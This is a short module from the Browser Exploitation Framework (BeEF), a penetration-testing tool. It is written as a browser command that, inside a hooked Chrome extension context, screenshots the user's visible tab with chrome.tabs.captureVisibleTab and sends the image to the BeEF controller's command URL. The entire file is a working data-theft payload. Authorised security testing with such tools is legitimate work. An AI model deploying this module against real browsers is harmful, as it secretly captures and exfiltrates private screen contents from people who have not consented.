//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    chrome.tabs.captureVisibleTab(null, function(img) {
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'img: ' + img.toString());
    });
});

